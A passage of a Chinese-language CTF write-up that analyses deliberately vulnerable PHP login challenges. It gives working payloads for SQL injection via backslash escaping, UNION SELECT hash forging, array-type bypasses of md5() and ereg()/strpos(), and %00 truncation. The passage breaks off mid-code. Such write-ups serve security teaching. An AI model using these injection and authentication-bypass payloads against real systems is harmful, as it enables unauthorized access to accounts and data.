class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528208.png\" alt=\"在这里插入图片描述\"><br>因此我们构造的最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nctf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528566.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"SQL注入or绕过\"><a href=\"#SQL注入or绕过\" class=\"headerlink\" title=\"SQL注入or绕过\"></a>SQL注入or绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#GOAL: login as admin,then get the flag;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span> <span class=\"token string single-quoted-string\">'db.inc.php'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">clean</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_magic_quotes_gpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span>\n        <span class=\"token variable\">$str</span><span class=\"token operator\">=</span><span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）。 </span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">ENT_QUOTES</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> @<span class=\"token function\">clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> @<span class=\"token function\">clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$query</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE name=\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$username</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\' AND pass=\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$password</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\';'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$result</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Invalid password!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$result</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token constant boolean\">false</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个的话也就是说有查询结果，且结果不为空时就可以输出flag，代码第三行有注释</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">#GOAL: login as admin,then get the flag;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>得到用户名为admin，此时看SQL注入语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$query</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE name=\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$username</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\' AND pass=\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$password</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\';'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这两个变量<code>username</code>和<code>password</code>都被clean函数包裹，clean函数简单看一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">clean</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_magic_quotes_gpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span>\n        <span class=\"token variable\">$str</span><span class=\"token operator\">=</span><span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//返回一个去除转义反斜线后的字符串（\\' 转换为 ' 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）。 </span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">ENT_QUOTES</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>了解到是当满足<code>get_magic_quotes_gpc()</code>时，此时会去除转义，否则返回转义后的结果，现在来看一下这个<code>get_magic_quotes_gpc()</code>函数<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528893.png\" alt=\"在这里插入图片描述\"><br>这里看的话始终返回false，因此这里就对单引号、双引号进行了转义，因此变量中是不能通过单引号或者双引号实现闭合从而进行SQL注入了，但<code>\\</code>未在转义范围内，我们此时就可以利用<code>\\</code>来影响原SQL语句，这里将SQL语句列出</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$query</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE name=\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$username</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\' AND pass=\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$password</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\';'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时我们不知道密码，肯定要对后面进行点什么，这里的思路的话就是让AND pass这句话变成一部分，此时后面随便写，比如万能语句<code>or 1#</code>使得语句不报错即可，那我们该怎么来实现呢，当然是借助<code>\\</code>，在name传值时后面加一个\\就可以实现，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span>admin\\<span class=\"token comment\">#&amp;password= or 1#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时语句就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$query</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE name=\\''</span>admin\\<span class=\"token string single-quoted-string\">'\\' AND pass=\\''</span><span class=\"token keyword\">or</span> <span class=\"token number\">1</span><span class=\"token comment\">#'\\';';</span>\n<span class=\"token comment\">//name=\\''admin\\'为一部分</span>\n<span class=\"token comment\">//\\' AND pass=\\'为一部分</span>\n<span class=\"token comment\">//or 1#为最后一部分</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其实简化一下也就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$query</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE name='</span>admin <span class=\"token keyword\">AND</span> pass<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">' or 1#'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>你会发现此时AND pass变成了name的一部分，后面不报错，此时就符号条件，语句就可以正常运行，此时就可以得到flag了，因此构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">name<span class=\"token operator\">=</span>admin\\<span class=\"token comment\">#&amp;password= or 1#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"密码md5比较绕过\"><a href=\"#密码md5比较绕过\" class=\"headerlink\" title=\"密码md5比较绕过\"></a>密码md5比较绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n   <span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SAE_MYSQL_HOST_M</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">.</span> <span class=\"token constant\">SAE_MYSQL_PORT</span><span class=\"token punctuation\">,</span><span class=\"token constant\">SAE_MYSQL_USER</span><span class=\"token punctuation\">,</span><span class=\"token constant\">SAE_MYSQL_PASS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">mysql_select_db</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SAE_MYSQL_DB</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> @<span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select pw from ctf where user=' <span class=\"token interpolation\"><span class=\"token variable\">$user</span></span> '\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">[</span>pw<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strcasecmp</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">[</span>pw<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">//strcasecmp:0 - 如果两个字符串相等</span>\n\n      <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Logged in! Key: ntcf&#123;**************&#125; &lt;/p>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;p>Log in failure!&lt;/p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>同之前的union select注入绕过一致，这里直接给出payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">user<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'union select 1,2,'</span>e10adc3949ba59abbe56e057f20f883e'<span class=\"token comment\">#</span>\n<span class=\"token operator\">&amp;</span>pass<span class=\"token operator\">=</span><span class=\"token number\">123456</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"md5-函数-使用数组绕过\"><a href=\"#md5-函数-使用数组绕过\" class=\"headerlink\" title=\"md5()函数===使用数组绕过\"></a>md5()函数===使用数组绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag&#123;test&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string single-quoted-string\">'Your password can not be your username.'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token keyword\">print</span> <span class=\"token string single-quoted-string\">'Invalid password'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里看的话是强比较，因此构造都为0exxx的那种是无法绕过的，但我们绕过的方式还有一种就是数组绕过，当函数应该用字符串时用数组，此时都会返回Null，值和类型都是相同的，因此构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">username<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n<span class=\"token operator\">&amp;</span>password<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528905.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"ereg-函数strpos-函数用数组返回NULL绕过\"><a href=\"#ereg-函数strpos-函数用数组返回NULL绕过\" class=\"headerlink\" title=\"ereg()函数strpos() 函数用数组返回NULL绕过\"></a>ereg()函数strpos() 函数用数组返回NULL绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span>  \n   \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ereg</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^[a-zA-Z0-9]+$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span>  \n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You password must be alphanumeric'</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'--'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span>  \n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Flag: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">else</span>  \n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Invalid password'</span><span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">&#125;</span>  \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话简单读一下代码就是password只允许为字母和数字，但只有出现–时才能输出flag，思路明显，用%00截断或者数组绕过</p>\n<h3 id=\"00截断-1\"><a href=\"#00截断-1\" class=\"headerlink\" title=\"%00截断\"></a>%00截断</h3><p>语句遇到%00就认为是休止符，不再往后看</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token operator\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528977.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"数组绕过-1\"><a href=\"#数组绕过-1\" class=\"headerlink\" title=\"数组绕过\"></a>数组绕过</h3><p>比较的是字符串，当我们传入数组时，就会返回Null，此时语句就变成了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token constant\">Null</span> <span class=\"token operator\">!==</span><span class=\"token constant boolean\">False</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个是成立的，因为这里是强比较，因此此时就会输出flag，所以我们构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"十六进制与数字比较\"><a href=\"#十六进制与数字比较\" class=\"headerlink\" title=\"十六进制与数字比较\"></a>十六进制与数字比较</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">noother_says_correct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag&#123;test&#125;'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$one</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//ord — 返回字符的 ASCII 码值</span>\n    <span class=\"token variable\">$nine</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'9'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ord — 返回字符的 ASCII 码值</span>\n    <span class=\"token variable\">$number</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'3735929054'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// Check all the input characters!</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token comment\">// Disallow all the digits!</span>\n        <span class=\"token variable\">$digit</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$digit</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$one</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$digit</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$nine</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Aha, digit not allowed!</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"flase\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token 